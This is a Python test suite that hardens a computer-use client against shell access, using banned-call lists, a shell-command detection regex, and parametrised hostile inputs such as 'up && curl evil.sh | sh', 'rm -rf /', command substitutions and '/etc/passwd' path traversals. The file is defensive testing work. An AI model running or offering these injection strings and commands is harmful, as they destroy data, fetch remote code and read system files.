"""The computer-use client must never be able to reach a shell.

These are guard tests, not behaviour tests: they read the client's source and
fail the build if a shell primitive appears in it, and they push hostile inputs
through the verb contract to check each one is refused rather than sanitised.

The operator's requirement was absolute — "ZERO CHANCE FOR SHELL ACCESS OF ANY
KIND" — so it is checked mechanically rather than left to review.
"""
import ast
import re
from pathlib import Path

import pytest

from backend import computeruse as cu

CLIENT = Path(__file__).resolve().parents[1] / "clients" / "computeruse" / "agent.py"
SOURCE = CLIENT.read_text()
TREE = ast.parse(SOURCE)


# --- 1. the client's source may not contain a way to execute a string --------

# Exact dotted names, so re.compile (fine) is not confused with builtin compile
# (not fine) and the client's own Runner.run is not confused with subprocess.run.
BANNED_DOTTED = {
    "os.system", "os.popen",
    "subprocess.getoutput", "subprocess.getstatusoutput",
    "pty.spawn", "commands.getoutput",
}
BANNED_BARE = {"eval", "exec", "compile", "__import__"}
BANNED_PREFIX = ("os.exec", "os.spawn", "os.posix_spawn")


def _calls():
    """(dotted-name, node) for every call in the client."""
    for node in ast.walk(TREE):
        if not isinstance(node, ast.Call):
            continue
        parts, f = [], node.func
        while isinstance(f, ast.Attribute):
            parts.append(f.attr)
            f = f.value
        if isinstance(f, ast.Name):
            parts.append(f.id)
        yield ".".join(reversed(parts)), node


def test_client_never_calls_an_interpreter():
    hits = []
    for dotted, _ in _calls():
        if dotted in BANNED_DOTTED or dotted.startswith(BANNED_PREFIX):
            hits.append(dotted)
        # a bare eval(...) is the builtin; re.compile is not
        if dotted in BANNED_BARE:
            hits.append(dotted)
    assert not hits, f"client calls {hits} — each is a way to execute a string"


def test_client_never_passes_shell_true():
    """shell=True anywhere turns an argv list back into a command line."""
    bad = []
    for dotted, node in _calls():
        for kw in node.keywords:
            if kw.arg == "shell" and not (
                    isinstance(kw.value, ast.Constant) and kw.value.value is False):
                bad.append(f"{dotted}(shell={ast.dump(kw.value)})")
    assert not bad, f"shell= is not literally False at: {bad}"


def test_subprocess_is_only_ever_given_an_argv_list():
    """subprocess must receive a list. A string first argument is the thing a
    shell would split, so the argument's type is the control."""
    checked = 0
    for dotted, node in _calls():
        if not dotted.startswith("subprocess.") or not node.args:
            continue
        checked += 1
        first = node.args[0]
        assert isinstance(first, (ast.List, ast.Name)), (
            f"{dotted} first arg is {type(first).__name__}: not an argv list")
    assert checked, "no subprocess calls found — has the client been restructured?"


def test_no_shell_command_string_is_ever_passed_to_a_call():
    """Prose may discuss os.system; code may not build 'sh -c ...'. This looks
    at string literals in argument position only, so documentation is free to
    explain what is banned."""
    pattern = re.compile(r"\b(sh|bash|zsh|dash)\b\s+-[a-z]*c\b|\|\s*(sh|bash)\b")
    for dotted, node in _calls():
        for arg in list(node.args) + [kw.value for kw in node.keywords]:
            if isinstance(arg, ast.Constant) and isinstance(arg.value, str):
                assert not pattern.search(arg.value), (
                    f"{dotted} is passed a shell command string: {arg.value!r}")


def test_binary_allowlist_is_closed_and_small():
    """Every executable the client may run is named in BANNED-adjacent
    BINARIES, resolved once, and nothing else is reachable."""
    import importlib.util
    spec = importlib.util.spec_from_file_location("cu_agent", CLIENT)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    assert set(mod.BINARIES) <= {
        "mpv", "pactl", "wpctl", "xdg-open", "xrandr", "osascript", "open"}
    # a shell must never be in it
    for shell in ("sh", "bash", "zsh", "fish", "python", "python3", "perl", "env"):
        assert shell not in mod.BINARIES


def test_runner_rejects_a_binary_outside_the_allowlist():
    import importlib.util
    spec = importlib.util.spec_from_file_location("cu_agent2", CLIENT)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    r = mod.Runner(dry_run=True)
    with pytest.raises(mod.Refused):
        r.run("sh", "-c", "echo pwned")
    with pytest.raises(mod.Refused):
        r.run("/bin/sh")


# --- 2. the verb contract refuses hostile input rather than cleaning it ------

def test_unknown_verbs_are_refused():
    for verb in ("exec", "shell", "run_code", "eval", ""):
        with pytest.raises(cu.VerbError):
            cu.validate(verb, {})


def test_unknown_parameters_are_refused_not_ignored():
    """Dropping an unexpected field silently is how a caller ends up believing
    a control was applied when it was not."""
    with pytest.raises(cu.VerbError):
        cu.validate("volume", {"action": "up", "command": "rm -rf /"})


@pytest.mark.parametrize("payload", [
    "up; rm -rf /", "up && curl evil.sh | sh", "$(whoami)", "`id`", "up\nrm -rf /",
])
def test_enum_fields_reject_injection_attempts(payload):
    with pytest.raises(cu.VerbError):
        cu.validate("volume", {"action": payload})


@pytest.mark.parametrize("url", [
    "file:///etc/passwd", "javascript:alert(1)", "data:text/html,<script>",
    "smb://server/share", "vnc://host", "ssh://host", "not a url", "",
])
def test_only_http_urls_may_be_opened(url):
    with pytest.raises(cu.VerbError):
        cu.validate("open_link", {"url": url})


def test_http_urls_pass():
    assert cu.validate("open_link", {"url": "https://example.com/x"})["url"]


@pytest.mark.parametrize("device", [
    "sink; rm -rf /", "$(id)", "a" * 200, "sink name with spaces", "sink`id`",
])
def test_device_ids_are_held_to_an_identifier_shape(device):
    with pytest.raises(cu.VerbError):
        cu.validate("volume", {"action": "up", "device": device})


@pytest.mark.parametrize("value", [-1, 101, 1000, True, "5", 3.5])
def test_bounded_integers_are_bounded(value):
    with pytest.raises(cu.VerbError):
        cu.validate("volume", {"action": "set", "percent": value})


def test_titles_may_not_carry_control_characters():
    with pytest.raises(cu.VerbError):
        cu.validate("play", {"kind": "audio", "path": "/x/y.mp3",
                             "title": "hi\x1b]0;pwned\x07"})


def test_relative_and_null_paths_are_refused():
    for p in ("../../etc/passwd", "x.mp3", "/x/\x00.mp3"):
        with pytest.raises(cu.VerbError):
            cu.validate("play", {"kind": "audio", "path": p})


# --- 3. grant containment ---------------------------------------------------

@pytest.mark.asyncio
async def test_paths_outside_a_granted_root_are_refused(tmp_path, monkeypatch):
    root = tmp_path / "Music"
    root.mkdir()
    (root / "song.mp3").write_bytes(b"\0")
    outside = tmp_path / "secret.mp3"
    outside.write_bytes(b"\0")

    async def fake_grants(db=None):
        return [cu.Grant(1, str(root), "test")]
    monkeypatch.setattr(cu, "list_grants", fake_grants)

    assert await cu.resolve_local(str(root / "song.mp3"), "audio")
    with pytest.raises(cu.VerbError):
        await cu.resolve_local(str(outside), "audio")
    with pytest.raises(cu.VerbError):
        await cu.resolve_local("/etc/passwd", "audio")


@pytest.mark.asyncio
async def test_a_symlink_out_of_the_granted_tree_is_refused(tmp_path, monkeypatch):
    """Containment is checked on the resolved path: the real file is what gets
    played, so the real file is what has to be inside."""
    root = tmp_path / "Music"
    root.mkdir()
    secret = tmp_path / "elsewhere.mp3"
    secret.write_bytes(b"\0")
    (root / "innocent.mp3").symlink_to(secret)

    async def fake_grants(db=None):
        return [cu.Grant(1, str(root), "test")]
    monkeypatch.setattr(cu, "list_grants", fake_grants)

    with pytest.raises(cu.VerbError):
        await cu.resolve_local(str(root / "innocent.mp3"), "audio")


@pytest.mark.asyncio
async def test_non_media_files_are_refused(tmp_path, monkeypatch):
    root = tmp_path / "Music"
    root.mkdir()
    (root / "id_rsa").write_text("KEY")
    (root / "notes.txt").write_text("x")

    async def fake_grants(db=None):
        return [cu.Grant(1, str(root), "test")]
    monkeypatch.setattr(cu, "list_grants", fake_grants)

    for name in ("id_rsa", "notes.txt"):
        with pytest.raises(cu.VerbError):
            await cu.resolve_local(str(root / name), "audio")


@pytest.mark.asyncio
async def test_with_no_grants_nothing_on_disk_is_reachable(monkeypatch):
    async def none(db=None):
        return []
    monkeypatch.setattr(cu, "list_grants", none)
    with pytest.raises(cu.VerbError):
        await cu.resolve_local("/home/someone/Music/x.mp3", "audio")


# --- 4. the client's own containment, independent of the backend ------------

def _agent(tmp_path, roots):
    import importlib.util
    spec = importlib.util.spec_from_file_location("cu_agent3", CLIENT)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod, mod.Agent("http://x", "t", roots, "test", dry_run=True)


def test_client_refuses_a_path_the_backend_says_is_fine(tmp_path):
    """The backend could be compromised; this check is what makes that
    survivable."""
    root = tmp_path / "Music"
    root.mkdir()
    (root / "ok.mp3").write_bytes(b"\0")
    outside = tmp_path / "outside.mp3"
    outside.write_bytes(b"\0")
    mod, agent = _agent(tmp_path, [str(root)])

    assert agent.check_playable(str(root / "ok.mp3"), "audio")
    with pytest.raises(mod.Refused):
        agent.check_playable(str(outside), "audio")
    with pytest.raises(mod.Refused):
        agent.check_playable("/etc/passwd", "audio")


def test_server_grants_cannot_widen_the_client_ceiling(tmp_path):
    """--allow-root is the ceiling. A grant naming somewhere else is dropped."""
    allowed = tmp_path / "Music"
    allowed.mkdir()
    elsewhere = tmp_path / "Documents"
    elsewhere.mkdir()
    mod, agent = _agent(tmp_path, [str(allowed)])

    agent.set_grants([str(elsewhere), "/etc", str(allowed)])
    assert agent.grants == [allowed.resolve()]

    (elsewhere / "x.mp3").write_bytes(b"\0")
    with pytest.raises(mod.Refused):
        agent.check_playable(str(elsewhere / "x.mp3"), "audio")


def test_client_rejects_unknown_verbs_and_params(tmp_path):
    mod, agent = _agent(tmp_path, [])
    with pytest.raises(mod.Refused):
        agent.handle("exec", {"cmd": "id"})
    with pytest.raises(mod.Refused):
        agent.handle("volume", {"action": "up", "extra": "x"})
    with pytest.raises(mod.Refused):
        agent.handle("open_link", {"url": "file:///etc/passwd"})


def test_mpv_is_launched_without_config_or_scripts(tmp_path):
    """mpv reads ~/.config/mpv by default and a Lua script there would be
    arbitrary code executing off the back of a play command."""
    root = tmp_path / "Music"
    root.mkdir()
    f = root / "a.mp3"
    f.write_bytes(b"\0")
    mod, agent = _agent(tmp_path, [str(root)])
    calls = []
    agent.runner.bin["mpv"] = "/usr/bin/mpv"
    agent.runner.run = lambda name, *a, **k: calls.append((name, a)) or None

    agent.handle("play", {"kind": "audio", "path": str(f)})
    name, args = calls[-1]
    assert name == "mpv"
    assert "--no-config" in args and "--load-scripts=no" in args
    # the file must come after -- so a filename can never be read as an option
    assert "--" in args and args.index("--") == len(args) - 2
